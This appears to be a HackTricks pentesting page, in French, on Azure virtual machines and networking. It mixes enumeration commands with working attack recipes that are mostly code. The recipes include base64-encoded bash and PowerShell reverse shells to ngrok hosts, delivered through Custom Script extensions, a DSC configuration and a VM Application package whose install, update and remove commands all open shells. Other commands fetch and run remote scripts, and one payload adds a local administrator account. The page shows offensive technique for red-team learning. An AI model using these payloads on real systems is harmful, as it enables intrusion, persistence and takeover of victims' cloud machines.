# Az - Machines Virtuelles & R√©seau

{% hint style="success" %}
Apprenez & pratiquez le Hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Apprenez & pratiquez le Hacking GCP : <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Informations de base sur le r√©seau Azure

Les r√©seaux Azure contiennent **diff√©rentes entit√©s et fa√ßons de les configurer.** Vous pouvez trouver une br√®ve **description,** **exemples** et **commandes d'√©num√©ration** des diff√©rentes entit√©s r√©seau Azure dans :

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Informations de base sur les VM

Les Machines Virtuelles (VM) Azure sont des serveurs **bas√©s sur le cloud flexibles et √† la demande qui vous permettent d'ex√©cuter des syst√®mes d'exploitation Windows ou Linux**. Elles vous permettent de d√©ployer des applications et des charges de travail sans g√©rer de mat√©riel physique. Les VM Azure peuvent √™tre configur√©es avec diverses options de CPU, de m√©moire et de stockage pour r√©pondre √† des besoins sp√©cifiques et s'int√©grer avec des services Azure tels que des r√©seaux virtuels, du stockage et des outils de s√©curit√©.

### Configurations de s√©curit√©

* **Zones de disponibilit√©** : Les zones de disponibilit√© sont des groupes distincts de centres de donn√©es au sein d'une r√©gion Azure sp√©cifique qui sont physiquement s√©par√©s pour minimiser le risque que plusieurs zones soient affect√©es par des pannes ou des catastrophes locales.
* **Type de s√©curit√©** :
* **S√©curit√© standard** : C'est le type de s√©curit√© par d√©faut qui ne n√©cessite aucune configuration sp√©cifique.
* **Lancement de confiance** : Ce type de s√©curit√© am√©liore la protection contre les kits de d√©marrage et les malwares au niveau du noyau en utilisant le Secure Boot et le Module de Plateforme de Confiance Virtuel (vTPM).
* **VMs confidentielles** : En plus d'un lancement de confiance, cela offre une isolation mat√©rielle entre la VM, l'hyperviseur et la gestion de l'h√¥te, am√©liore le chiffrement des disques et [**plus**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **Authentification** : Par d√©faut, une nouvelle **cl√© SSH est g√©n√©r√©e**, bien qu'il soit possible d'utiliser une cl√© publique ou d'utiliser une cl√© pr√©c√©dente et le nom d'utilisateur par d√©faut est **azureuser**. Il est √©galement possible de configurer l'utilisation d'un **mot de passe.**
* **Chiffrement des disques VM :** Le disque est chiffr√© au repos par d√©faut en utilisant une cl√© g√©r√©e par la plateforme.
* Il est √©galement possible d'activer le **Chiffrement √† l'h√¥te**, o√π les donn√©es seront chiffr√©es dans l'h√¥te avant d'√™tre envoy√©es au service de stockage, garantissant un chiffrement de bout en bout entre l'h√¥te et le service de stockage ([**docs**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)).
* **Groupe de s√©curit√© r√©seau NIC** :
* **Aucun** : Ouvre essentiellement tous les ports
* **Basique** : Permet d'ouvrir facilement les ports entrants HTTP (80), HTTPS (443), SSH (22), RDP (3389)
* **Avanc√©** : S√©lectionnez un groupe de s√©curit√©
* **Sauvegarde** : Il est possible d'activer une sauvegarde **Standard** (une par jour) et **Am√©lior√©e** (plusieurs par jour)
* **Options d'orchestration des correctifs** : Cela permet d'appliquer automatiquement des correctifs dans les VM selon la politique s√©lectionn√©e comme d√©crit dans les [**docs**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching).
* **Alertes** : Il est possible de recevoir automatiquement des alertes par e-mail ou application mobile lorsque quelque chose se produit dans la VM. R√®gles par d√©faut :
* Pourcentage CPU sup√©rieur √† 80%
* Octets de m√©moire disponibles inf√©rieurs √† 1 Go
* Pourcentage d'I/O consomm√© par les disques de donn√©es sup√©rieur √† 95%
* Pourcentage d'I/O consomm√© par le syst√®me d'exploitation sup√©rieur √† 95%
* R√©seau total sup√©rieur √† 500 Go
* R√©seau sortant total sup√©rieur √† 200 Go
* VmAvailabilityMetric inf√©rieur √† 1
* **Moniteur de sant√©** : Par d√©faut, v√©rifie le protocole HTTP sur le port 80
* **Verrous** : Cela permet de verrouiller une VM afin qu'elle ne puisse √™tre que lue (**Verrouillage en lecture seule**) ou qu'elle puisse √™tre lue et mise √† jour mais pas supprim√©e (**Verrouillage non supprimable**).
* La plupart des ressources li√©es aux VM **supportent √©galement les verrous** comme les disques, les instantan√©s...
* Les verrous peuvent √©galement √™tre appliqu√©s au **niveau du groupe de ressources et de l'abonnement**

## Disques & instantan√©s

* Il est possible de **permettre d'attacher un disque √† 2 VM ou plus**
* Par d√©faut, chaque disque est **chiffr√©** avec une cl√© de plateforme.
* M√™me dans les instantan√©s
* Par d√©faut, il est possible de **partager le disque depuis tous les r√©seaux**, mais il peut √©galement √™tre **restreint** √† certains **acc√®s priv√©s** ou √† **d√©sactiver compl√®tement** l'acc√®s public et priv√©.
* M√™me dans les instantan√©s
* Il est possible de **g√©n√©rer un URI SAS** (d'une dur√©e maximale de 60 jours) pour **exporter le disque**, qui peut √™tre configur√© pour n√©cessiter une authentification ou non
* M√™me dans les instantan√©s
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
## Images, Images de galerie & Points de restauration

Une **image de VM** est un mod√®le qui contient le syst√®me d'exploitation, les param√®tres d'application et le syst√®me de fichiers n√©cessaires pour **cr√©er une nouvelle machine virtuelle (VM)**. La diff√©rence entre une image et un instantan√© de disque est qu'un instantan√© de disque est une copie en lecture seule, √† un moment donn√©, d'un seul disque g√©r√©, utilis√© principalement pour la sauvegarde ou le d√©pannage, tandis qu'une image peut contenir **plusieurs disques et est con√ßue pour servir de mod√®le pour cr√©er de nouvelles VMs**.\
Les images peuvent √™tre g√©r√©es dans la **section Images** d'Azure ou √† l'int√©rieur des **galeries de calcul Azure**, ce qui permet de g√©n√©rer des **versions** et de **partager** l'image entre locataires ou m√™me de la rendre publique.

Un **point de restauration** stocke la configuration de la VM et des **instantan√©s coh√©rents au moment donn√©** de toutes les disques g√©r√©s attach√©s √† la VM. Il est li√© √† la VM et son but est de pouvoir restaurer cette VM √† son √©tat √† ce moment pr√©cis.
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
## Azure Site Recovery

D'apr√®s les [**docs**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview) : Site Recovery aide √† garantir la continuit√© des activit√©s en maintenant les applications et charges de travail en fonctionnement pendant les pannes. Site Recovery **r√©plique les charges de travail** fonctionnant sur des machines physiques et virtuelles (VM) d'un site principal √† un emplacement secondaire. Lorsqu'une panne se produit sur votre site principal, vous basculez vers un emplacement secondaire et acc√©dez aux applications depuis l√†. Une fois que l'emplacement principal est de nouveau op√©rationnel, vous pouvez y revenir.

## Azure Bastion

Azure Bastion permet un acc√®s **Remote Desktop Protocol (RDP)** et **Secure Shell (SSH)** s√©curis√© et sans faille √† vos machines virtuelles (VM) directement via le portail Azure ou via une jump box. En **√©liminant le besoin d'adresses IP publiques** sur vos VM.&#x20;

Le Bastion d√©ploie un sous-r√©seau appel√© **`AzureBastionSubnet`** avec un masque de sous-r√©seau `/26` dans le VNet sur lequel il doit fonctionner. Ensuite, il permet de **se connecter aux VM internes via le navigateur** en utilisant `RDP` et `SSH`, √©vitant ainsi d'exposer les ports des VM √† Internet. Il peut √©galement fonctionner comme un **h√¥te de saut**.

Pour lister tous les h√¥tes Azure Bastion dans votre abonnement et vous connecter aux VM via eux, vous pouvez utiliser les commandes suivantes :

{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}

## M√©tadonn√©es

Le service de m√©tadonn√©es d'instance Azure (IMDS) **fournit des informations sur les instances de machines virtuelles en cours d'ex√©cution** pour aider √† leur gestion et configuration. Il offre des d√©tails tels que le SKU, le stockage, les configurations r√©seau et des informations sur les √©v√©nements de maintenance √† venir via **l'API REST disponible √† l'adresse IP non routable 169.254.169.254**, qui est accessible uniquement depuis l'int√©rieur de la VM. La communication entre la VM et l'IMDS reste √† l'int√©rieur de l'h√¥te, garantissant un acc√®s s√©curis√©. Lors de l'interrogation de l'IMDS, les clients HTTP √† l'int√©rieur de la VM doivent contourner les proxies web pour assurer une communication appropri√©e.

De plus, pour contacter le point de terminaison des m√©tadonn√©es, la requ√™te HTTP doit avoir l'en-t√™te **`Metadata: true`** et ne doit pas avoir l'en-t√™te **`X-Forwarded-For`**.

V√©rifiez comment l'√©num√©rer dans :

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## √ânum√©ration de VM

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}

{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
{% endtab %}
{% endtabs %}

## Ex√©cution de code dans les VMs

### Extensions de VM

Les extensions de VM Azure sont de petites applications qui fournissent des **configurations post-d√©ploiement** et des t√¢ches d'automatisation sur les machines virtuelles Azure (VMs).

Cela permettrait d'**ex√©cuter du code arbitraire √† l'int√©rieur des VMs**.

La permission requise est **`Microsoft.Compute/virtualMachines/extensions/write`**.

Il est possible de lister toutes les extensions disponibles avec :
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
Il est possible de **faire fonctionner des extensions personnalis√©es qui ex√©cutent du code personnalis√©** :

{% tabs %}
{% tab title="Linux" %}
* Ex√©cuter un shell invers√©

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* Ex√©cuter un script situ√© sur Internet

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* Ex√©cuter un shell invers√©

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* Ex√©cuter un shell invers√© √† partir d'un fichier

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

Vous pouvez √©galement ex√©cuter d'autres charges utiles comme : `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* R√©initialiser le mot de passe en utilisant l'extension VMAccess

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Extensions de VM pertinentes

L'autorisation requise est toujours **`Microsoft.Compute/virtualMachines/extensions/write`**.

<details>

<summary>Extension VMAccess</summary>

Cette extension permet de modifier le mot de passe (ou de cr√©er un mot de passe s'il n'existe pas) des utilisateurs √† l'int√©rieur des VM Windows.

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

Ceci est une **extension de VM** qui appartient √† Microsoft et qui utilise PowerShell DSC pour g√©rer la configuration des VMs Windows Azure. Par cons√©quent, elle peut √™tre utilis√©e pour **ex√©cuter des commandes arbitraires** dans les VMs Windows via cette extension :
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>Hybrid Runbook Worker</summary>

C'est une extension de VM qui permet d'ex√©cuter des runbooks dans des VMs √† partir d'un compte d'automatisation. Pour plus d'informations, consultez le [service des comptes d'automatisation](../az-automation-account/).

</details>

### Applications VM

Ce sont des packages contenant toutes les **donn√©es d'application et les scripts d'installation et de d√©sinstallation** qui peuvent √™tre utilis√©s pour ajouter et supprimer facilement des applications dans des VMs.

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

Voici les chemins o√π les applications sont t√©l√©charg√©es dans le syst√®me de fichiers :

* Linux : `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows : `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

V√©rifiez comment installer de nouvelles applications dans [https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)

{% hint style="danger" %}
Il est possible de **partager des applications et des galeries individuelles avec d'autres abonnements ou locataires**. Ce qui est tr√®s int√©ressant car cela pourrait permettre √† un attaquant d'installer une porte d√©rob√©e dans une application et de pivoter vers d'autres abonnements et locataires.
{% endhint %}

Mais il **n'y a pas de "march√©" pour les applications vm** comme il y en a pour les extensions.

Les autorisations requises sont :

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

Exemple d'exploitation pour ex√©cuter des commandes arbitraires :

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
